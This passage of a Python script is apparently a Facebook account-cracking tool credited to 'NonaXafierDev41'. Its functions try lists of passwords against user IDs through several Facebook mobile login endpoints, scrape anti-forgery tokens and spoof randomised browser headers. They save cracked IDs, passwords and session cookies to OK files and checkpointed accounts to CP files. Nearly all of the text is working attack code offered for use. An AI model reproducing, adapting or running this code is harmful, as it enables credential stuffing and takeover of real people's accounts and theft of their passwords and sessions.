fsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfcc815e62c9dea3d8%26domain%3Dwww.joox.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.joox.com%252Ffe5c1e614950497cf%26relation%3Dopener%26frame%3Df50e05a96e3646380%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
'email': idf,
'prefill_contact_point': idf,
'prefill_source': 'browser_onload',
'prefill_type': 'contact_point',
'first_prefill_source': 'browser_dropdown',
'first_prefill_type': 'contact_point',
'had_cp_prefilled': 'true',
'had_password_prefilled': 'false',
'is_smart_lock': 'false',
'bi_xrwh': '0',
'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),pw),
'fb_dtsg': '',
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'__dyn': '',
'__csr': '',
'__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']), 
'__a': '',
'__user':0
}
			headers = {
'authority': 'm.facebook.com',
'accept': '*/*',
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
'content-type': 'application/x-www-form-urlencoded',
'dpr': '2',
'origin': 'https://m.facebook.com',
'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=1663534280540672&kid_directed_site=0&app_id=1663534280540672&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D1663534280540672%26auth_type%26cbt%3D1707300145639%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfd779066dd5b40b99%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%26client_id%3D1663534280540672%26display%3Dtouch%26domain%3Dwww.joox.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.joox.com%252Fid%252Flogin%26locale%3Den_US%26logger_id%3Dfeb763709d5e8b032%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfcc815e62c9dea3d8%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%2526frame%253Df50e05a96e3646380%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv2.3%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfcc815e62c9dea3d8%26domain%3Dwww.joox.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.joox.com%252Ffe5c1e614950497cf%26relation%3Dopener%26frame%3Df50e05a96e3646380%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
'sec-ch-prefers-color-scheme': 'light',
'sec-ch-ua': f'"Not_A Brand";v="{str(rr(8,24))}", "Chromium";v="{str(rr(110,120))}"',
'sec-ch-ua-full-version-list': f'"Not_A Brand";v="{str(rr(8,24))}.0.0.0", "Chromium";v="{str(rr(110,120))}.0.{str(rr(3000,6000))}.{str(rr(110,120))}"',
'sec-ch-ua-mobile': '?1',
'sec-ch-ua-platform': '"Android"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'user-agent': ua,
'viewport-width': f'{str(rr(300,999))}',
'x-asbd-id': '129477',
'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'x-requested-with': 'XMLHttpRequest',
'x-response-format': 'JSONStream',
}
			params = {
'refsrc': 'deprecated',
'lwv': '100',
}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=1663534280540672&auth_token=b17ee38811884c2a4fea894114da656a&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D1663534280540672%26auth_type%26cbt%3D1707300145639%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfd779066dd5b40b99%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%26client_id%3D1663534280540672%26display%3Dtouch%26domain%3Dwww.joox.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.joox.com%252Fid%252Flogin%26locale%3Den_US%26logger_id%3Dfeb763709d5e8b032%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfcc815e62c9dea3d8%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%2526frame%253Df50e05a96e3646380%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv2.3%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=1663534280540672&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfcc815e62c9dea3d8%26domain%3Dwww.joox.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.joox.com%252Ffe5c1e614950497cf%26relation%3Dopener%26frame%3Df50e05a96e3646380%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100',params=params,headers=headers,data=data,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r {A}[{S}✓{A}] {G1}{nbf_ok}\n {A}[{S}✓{A}] User  : {G2}{idf}\n {A}[{S}✓{A}] Pass  : {G2}{pw}\n {A}[{S}✓{A}] Tools : {X4}NonaXafierDev41\n')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
			elif "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f'\r {A}[{R}X{A}] {G1}{nbf_cp}\n {A}[{R}X{A}] User  : {Y}{idf}\n {A}[{R}X{A}] Pass  : {Y}{pw}\n {A}[{R}X{A}] Tools : {X4}NonaXafierDev41\n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1

def validate(idf,pwv):
	global loop,ok,cp
	rc = random.choice
	rr = random.randint
	dm = random.choice([A,R,Y,G,B,G1,G2,G3,G4,G5,X,X1,X2,X3,X4,X5,S,M])
	md = random.choice([G2,A,B,R,M,X,X5,G3,A,S,B,Y,X5,G2,G5,A,S,B,Y,R])
	rd = random.choice([G2,A,B,R,M,X,X5,G3,X1,X2,X3,X4,X5,S,M])
	sys.stdout.write(f"\r{rd}NONA-M2{A}|{dm}{loop}{A}|{md}{len(id)}{A}|{rd}OK-{oks}{A}|{dm}CP-{cps}")
	sys.stdout.flush()
	ua2 = api()
	ses = requests.Session()
	for pw in pwv:
		try: 
			url = random.choice(['m.prod.facenook.com','free.prod.facebook.com'])
			link = ses.get("https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daf919600-a681-4aeb-a128-05e90339859f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			date = (
			{
			"lsd":
			      re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
			"jazoest":
			      re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
	        "uid":idf,
	        "next": "https://x.facebook.com/v3.1/dialog/oauth?client_id=3213804762189845&redirect_uri=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success&scope=email&state=0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%253D&ret=login&fbapp_pres=0&logger_id=af919600-a681-4aeb-a128-05e90339859f&tp=unspecified",
	        "flow":"login_no_pin",
	        "pass":pw,
	        } 
	    )    
			cuoz = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])		
			head=(
		{
		'Host': url,
		'cache-control': 'max-age=0',
		'upgrade-insecure-requests': '1',
		'origin': f'https://'+url,
	     'content-type': 'application/x-www-form-urlencoded',
	     'x-requested-with': 'XMLHttpRequest',
		'user-agent': ua2,
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		'sec-fetch-site': 'same-origin',
	     'sec-fetch-mode': 'navigate',
	     'sec-fetch-user': '?1',
	     'sec-fetch-dest': 'document',
		'dpr': f'{str(rr(1,5))}',
		'viewport-width': f'{str(rr(300,999))}',
	     'sec-ch-ua': f'"Not)A;Brand";v="{str(rr(8,24))}", "Chromium";v="{str(rr(99,116))}"',
	     'sec-ch-ua-mobile': '?1',
	     'sec-ch-ua-platform': '"Android"',
	     'sec-ch-ua-platform-version': f'"{str(rr(5,14))}.0.0"',
	     'sec-ch-ua-full-version-list': f'"Not)A;Brand";v="{str(rr(8,24))}.0.0.0", "Chromium";v="{str(rr(99,120))}.0.{str(rr(5000,5999))}.{str(rr(40,150))}"',
	     'sec-ch-prefers-color-scheme': 'dark',
	     'referer': f'https://{url}/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daf919600-a681-4aeb-a128-05e90339859f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
	     'accept-encoding': 'gzip, deflate, br',
	     'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
	     }
	 )
			po = ses.post(f"https://{url}/login/device-based/validate-password/?shbl=0&locale2=id_ID", headers=head, data=date, cookies={'cookie': cuoz}, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r {A}[{S}✓{A}] {G1}{nbf_ok}\n {A}[{S}✓{A}] User  : {G2}{idf}\n {A}[{S}✓{A}] Pass  : {G2}{pw}\n {A}[{S}✓{A}] Tools : {X4}NonaXafierDev41\n')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp+=1
				print(f'\r {A}[{R}X{A}] {G1}{nbf_cp}\n {A}[{R}X{A}] User  : {Y}{idf}\n {A}[{R}X{A}] Pass  : {Y}{pw}\n {A}[{R}X{A}] Tools : {X4}NonaXafierDev41\n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1

def freefb(idf,pwv):
	global loop,ok,cp
	dm = random.choice([A,R,Y,G,B,G1,G2,G3,G4,G5,X,X1,X2,X3,X4,X5,S,M])
	md = random.choice([G2,A,B,R,M,X,X5,G3,A,S,B,Y,X5,G2,G5,A,S,B,Y,R])
	rd = random.choice([G2,A,B,R,M,X,X5,G3,X1,X2,X3,X4,X5,S,M])
	sys.stdout.write(f"\r{rd}NONA-M3{A}|{dm}{loop}{A}|{md}{len(id)}{A}|{rd}OK-{oks}{A}|{dm}CP-{cps}")
	sys.stdout.flush()
	ua = api()
	rc = random.choice
	rr = random.randint
	ses = requests.Session()
	for pw in pwv:
		try: 
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r {A}[{S}✓{A}] {G1}{nbf_ok}\n {A}[{S}✓{A}] User  : {G2}{idf}\n {A}[{S}✓{A}] Pass  : {G2}{pw}\n {A}[{S}✓{A}] Tools : {X4}NonaXafierDev41\n')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
			elif "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f'\r {A}[{R}X{A}] {G1}{nbf_cp}\n {A}[{R}X{A}] User  : {Y}{idf}\n {A}[{R}X{A}] Pass  : {Y}{pw}\n {A}[{R}X{A}] Tools : {X4}NonaXafierDev41\n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1

if __name__ == '__main__':
	try:os.mkdir('NBF_OK')
	except:pass
	try:os.mkdir('NBF_CP')
	except:pass
	try:os.system('clear')
	except:pass
	login()
